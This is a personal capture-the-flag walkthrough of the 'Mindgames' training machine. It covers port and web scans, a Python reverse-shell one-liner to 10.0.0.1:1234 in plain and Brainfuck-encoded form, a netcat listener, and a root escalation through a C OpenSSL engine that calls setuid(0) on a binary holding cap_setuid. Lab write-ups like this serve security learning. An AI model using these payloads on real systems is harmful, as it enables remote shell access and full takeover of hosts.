@@ -1,0 +1,216 @@
+Mindgames is an intermediate boot2root machine
+IP: 10.10.134.54
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# nmap -A -T4 10.10.134.54 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 11:54 IST
+Nmap scan report for 10.10.134.54
+Host is up (0.18s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Mindgames.
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/6%OT=80%CT=1%CU=38799%PV=Y%DS=2%DC=T%G=Y%TM=5F7C0DC
+OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=106%GCD=2%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O
+OS:3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=F4B3%W2=
+OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSN
+OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   143.67 ms 10.9.0.1
+2   194.77 ms 10.10.134.54
+
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.134.54
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Oct  6 11:59:18 2020
+URL_BASE: http://10.10.134.54/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.134.54/ ----
++ http://10.10.134.54/index.html (CODE:301|SIZE:0)                                                                                                           
+                                                                                                                                                             
+-----------------
+END_TIME: Tue Oct  6 12:10:59 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@LAPTOP-U5913CMD:/home/akshay# 
+
+
+
+root@LAPTOP-U5913CMD:/home/akshay# nikto -h 10.10.134.54
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.134.54
++ Target Hostname:    10.10.134.54
++ Target Port:        80
++ Start Time:         2020-10-06 11:59:43 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ 7889 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2020-10-06 12:19:57 (GMT5.5) (1214 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+Both the dirb and nikto scan gave me nothing.
+
+
+I did a all port scan and found this
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# nmap -T4 -p- 10.10.134.54
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 12:22 IST
+Warning: 10.10.134.54 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.134.54
+Host is up (0.15s latency).
+Not shown: 65532 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+3623/tcp filtered haipe-discover
+
+Nmap done: 1 IP address (1 host up) scanned in 765.78 seconds
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# 
+
+
+I did a lot of enumeration using gobuster and big.txt directory list but got nothing.
+
+I saw this input which runs python program in the form of brainfuck.
+So I wrote a little script to check whether the python program is working or not.
+I was getting error regarding syntax then I visited to this website which gave me positive results.
+
+https://copy.sh/brainfuck/text.html
+
+Program Output:
+
+Hello
+Its working
+
+Its working.
+So lets try to get reverse shell first.
+
+I wrote a simple script
+
+import os
+os.system("ls")
+
+Program Output:
+
+resources
+server
+
+
+So lets try to get reverse shell now.
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
++[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.---[->++++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>--.-[--->++<]>+.++.+[->+++<]>.++++++++++++++.++.---.------------.++.[--->+<]>----..-[++>---<]>+.-[----->+<]>.++++.+[-->+<]>+.-[->++<]>-.+[-->+<]>+++.---[->++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.[--->++<]>-.----.------------.++++++++.------.[--->+<]>---.+[--->+<]>+.--[->+++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.--[-->+++<]>-.+++++.[->+++++<]>+.[--->+++++<]>.+++++.---------.>-[--->+<]>-.[-->+<]>++.-[--->++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.>-[--->+<]>--.----.[----->+<]>.++++++++.--[----->+++<]>.------------.+.--.-[->++++<]>+.----.++++++++++++.+[-->+<]>++.-[-->+++<]>-.-[->++<]>-.+[++>---<]>.--[--->+<]>-.++++++++++++.-..---------.--.-[--->+<]>--.+[--->+<]>+..------.[-->+++<]>--.-.--.+++++++++++.-----------.++++++++++.-------.---.++++++++.----.+[--->++<]>.++++++++++.+++++.+.+.+.-----------..-[-->+++<]>-.---[->++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++.-------.-[-->+++<]>-.+[-->+<]>++.+++++[->+++<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.+++++.--------.-[-->+++<]>-.+[-->+<]>++.+++++[->+++<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++++.---------.-[-->+++<]>-.---[->++<]>.[-->+<]>+++++.---[->++<]>-.++.+[->+++<]>.++++++++++++++.++.---.------------.++.[--->+<]>----..+[++>---<]>.--[--->+<]>-.--.+++++++++++..[--->+<]>++++.[------>+<]>-.[->++++++<]>.+++++++++++++.++[->++<]>.+++++++.+++++.++[->+++++<]>-.-[--->++<]>-.-----------.--[--->+<]>.++++++++++.----------.+++++++++++.[--->+++++++<]>.[--->+<]>-.---[->+++<]>.-[->++++++<]>+.-[-->+++<]>-.
+
+This is the brainfuck code for the reverse shell and setup a netcat listener and listen for incoming connections on any port.
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.208.191 46724
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
+$ 
+
+
+$ python -c "import pty;pty.spawn('/bin/bash')"
+/bin/sh: 2: python: not found
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+mindgames@mindgames:~/webserver$ id
+id
+uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
+mindgames@mindgames:~/webserver$ 
+
+SO I found out about this.
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                  
+Current capabilities:                                                                                                                                         
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities:
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/openssl = cap_setuid+ep
+/home/mindgames/webserver/server = cap_net_bind_service+ep
+/home/mindgames/webserver/server = cap_net_bind_service+ep is writable
+
+
+We can use this cap_setuid+ep
+
+I got this script that we can use to set user id to 0 i.e root.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# cat root.c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id) 
+{
+ setuid(0);
+ setgid(0);
+ system("/bin/bash");
+ return 0;
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames#
+
+If you get error try installing this:
+sudo apt-get install libssl-dev
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# gcc -fPIC -o root.o -c root.c && gcc -shared -o root.so -lcrypto root.o
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# ls
+a.o  engine.c  root.c  root.o  root.so walkthrough.txt
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Mindgames# 
+
+mindgames@mindgames:/tmp$ openssl req -engine ./root.so
+openssl req -engine ./root.so
+root@mindgames:/tmp# id
+id
+uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
+root@mindgames:/tmp# 
+
+This machine was actually a brainfuck.
+I learned a lot from this machine about openssl engine & cap_setuid
+
+
+Thank you...Happy Hacking :)
